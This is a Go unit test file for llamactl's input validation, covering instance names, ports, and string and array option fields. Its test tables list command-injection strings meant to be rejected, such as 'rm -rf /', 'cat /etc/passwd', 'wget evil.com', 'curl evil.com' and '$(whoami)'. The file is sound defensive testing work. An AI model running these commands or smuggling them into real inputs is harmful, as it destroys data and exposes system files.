package llamactl_test

import (
	"strings"
	"testing"

	llamactl "llamactl/pkg"
)

func TestValidateInstanceName(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		// Valid names
		{"simple name", "myinstance", false},
		{"with numbers", "instance123", false},
		{"with hyphens", "my-instance", false},
		{"with underscores", "my_instance", false},
		{"mixed valid chars", "test-instance_123", false},
		{"single char", "a", false},
		{"max length", strings.Repeat("a", 50), false},

		// Invalid names - basic validation
		{"empty name", "", true},
		{"with spaces", "my instance", true},
		{"with dots", "my.instance", true},
		{"with special chars", "my@instance", true},
		{"too long", strings.Repeat("a", 51), true},

		// Invalid names - injection prevention
		{"shell metachar semicolon", "test;ls", true},
		{"shell metachar pipe", "test|ls", true},
		{"shell metachar ampersand", "test&ls", true},
		{"shell metachar dollar", "test$var", true},
		{"shell metachar backtick", "test`cmd`", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := llamactl.ValidateInstanceName(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateInstanceName(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateInstanceOptions_NilOptions(t *testing.T) {
	err := llamactl.ValidateInstanceOptions(nil)
	if err == nil {
		t.Error("Expected error for nil options")
	}
	if !strings.Contains(err.Error(), "options cannot be nil") {
		t.Errorf("Expected 'options cannot be nil' error, got: %v", err)
	}
}

func TestValidateInstanceOptions_PortValidation(t *testing.T) {
	tests := []struct {
		name    string
		port    int
		wantErr bool
	}{
		{"valid port 0", 0, false}, // 0 means auto-assign
		{"valid port 80", 80, false},
		{"valid port 8080", 8080, false},
		{"valid port 65535", 65535, false},
		{"negative port", -1, true},
		{"port too high", 65536, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			options := &llamactl.CreateInstanceOptions{
				LlamaServerOptions: llamactl.LlamaServerOptions{
					Port: tt.port,
				},
			}

			err := llamactl.ValidateInstanceOptions(options)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateInstanceOptions(port=%d) error = %v, wantErr %v", tt.port, err, tt.wantErr)
			}
		})
	}
}

func TestValidateInstanceOptions_StringInjection(t *testing.T) {
	tests := []struct {
		name    string
		value   string
		wantErr bool
	}{
		// Safe strings - these should all pass
		{"simple string", "model.gguf", false},
		{"path with slashes", "/path/to/model.gguf", false},
		{"with spaces", "my model file.gguf", false},
		{"with numbers", "model123.gguf", false},
		{"with dots", "model.v2.gguf", false},
		{"with equals", "param=value", false},
		{"with quotes", `"quoted string"`, false},
		{"empty string", "", false},
		{"with dashes", "model-name", false},
		{"with underscores", "model_name", false},

		// Dangerous strings - command injection attempts
		{"semicolon injection", "model.gguf; rm -rf /", true},
		{"pipe injection", "model.gguf | cat /etc/passwd", true},
		{"ampersand injection", "model.gguf & wget evil.com", true},
		{"dollar injection", "model.gguf $HOME", true},
		{"backtick injection", "model.gguf `cat /etc/passwd`", true},
		{"command substitution", "model.gguf $(whoami)", true},
		{"multiple metacharacters", "model.gguf; cat /etc/passwd | grep root", true},

		// Control character injection attempts
		{"newline injection", "model.gguf\nrm -rf /", true},
		{"carriage return", "model.gguf\rrm -rf /", true},
		{"tab injection", "model.gguf\trm -rf /", true},
		{"null byte", "model.gguf\x00rm -rf /", true},
		{"form feed", "model.gguf\frm -rf /", true},
		{"vertical tab", "model.gguf\vrm -rf /", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Test with Model field (string field)
			options := &llamactl.CreateInstanceOptions{
				LlamaServerOptions: llamactl.LlamaServerOptions{
					Model: tt.value,
				},
			}

			err := llamactl.ValidateInstanceOptions(options)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateInstanceOptions(model=%q) error = %v, wantErr %v", tt.value, err, tt.wantErr)
			}
		})
	}
}

func TestValidateInstanceOptions_ArrayInjection(t *testing.T) {
	tests := []struct {
		name    string
		array   []string
		wantErr bool
	}{
		// Safe arrays
		{"empty array", []string{}, false},
		{"single safe item", []string{"value1"}, false},
		{"multiple safe items", []string{"value1", "value2", "value3"}, false},
		{"paths", []string{"/path/to/file1", "/path/to/file2"}, false},

		// Dangerous arrays - injection in different positions
		{"injection in first item", []string{"value1; rm -rf /", "value2"}, true},
		{"injection in middle item", []string{"value1", "value2 | cat /etc/passwd", "value3"}, true},
		{"injection in last item", []string{"value1", "value2", "value3 & wget evil.com"}, true},
		{"command substitution", []string{"$(whoami)", "value2"}, true},
		{"backtick injection", []string{"value1", "`cat /etc/passwd`"}, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Test with Lora field (array field)
			options := &llamactl.CreateInstanceOptions{
				LlamaServerOptions: llamactl.LlamaServerOptions{
					Lora: tt.array,
				},
			}

			err := llamactl.ValidateInstanceOptions(options)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateInstanceOptions(lora=%v) error = %v, wantErr %v", tt.array, err, tt.wantErr)
			}
		})
	}
}

func TestValidateInstanceOptions_MultipleFieldInjection(t *testing.T) {
	// Test that injection in any field is caught
	tests := []struct {
		name    string
		options *llamactl.CreateInstanceOptions
		wantErr bool
	}{
		{
			name: "injection in model field",
			options: &llamactl.CreateInstanceOptions{
				LlamaServerOptions: llamactl.LlamaServerOptions{
					Model:  "safe.gguf",
					HFRepo: "microsoft/model; curl evil.com",
				},
			},
			wantErr: true,
		},
		{
			name: "injection in log file",
			options: &llamactl.CreateInstanceOptions{
				LlamaServerOptions: llamactl.LlamaServerOptions{
					Model:   "safe.gguf",
					LogFile: "/tmp/log.txt | tee /etc/passwd",
				},
			},
			wantErr: true,
		},
		{
			name: "all safe fields",
			options: &llamactl.CreateInstanceOptions{
				LlamaServerOptions: llamactl.LlamaServerOptions{
					Model:   "/path/to/model.gguf",
					HFRepo:  "microsoft/DialoGPT-medium",
					LogFile: "/tmp/llama.log",
					Device:  "cuda:0",
					Port:    8080,
				},
			},
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := llamactl.ValidateInstanceOptions(tt.options)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateInstanceOptions() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateInstanceOptions_NonStringFields(t *testing.T) {
	// Test that non-string fields don't interfere with validation
	options := &llamactl.CreateInstanceOptions{
		AutoRestart:  boolPtr(true),
		MaxRestarts:  intPtr(5),
		RestartDelay: intPtr(10),
		LlamaServerOptions: llamactl.LlamaServerOptions{
			Port:        8080,
			GPULayers:   32,
			CtxSize:     4096,
			Temperature: 0.7,
			TopK:        40,
			TopP:        0.9,
			Verbose:     true,
			FlashAttn:   false,
		},
	}

	err := llamactl.ValidateInstanceOptions(options)
	if err != nil {
		t.Errorf("ValidateInstanceOptions with non-string fields should not error, got: %v", err)
	}
}

// Helper functions for pointer fields
func boolPtr(b bool) *bool {
	return &b
}

func intPtr(i int) *int {
	return &i
}
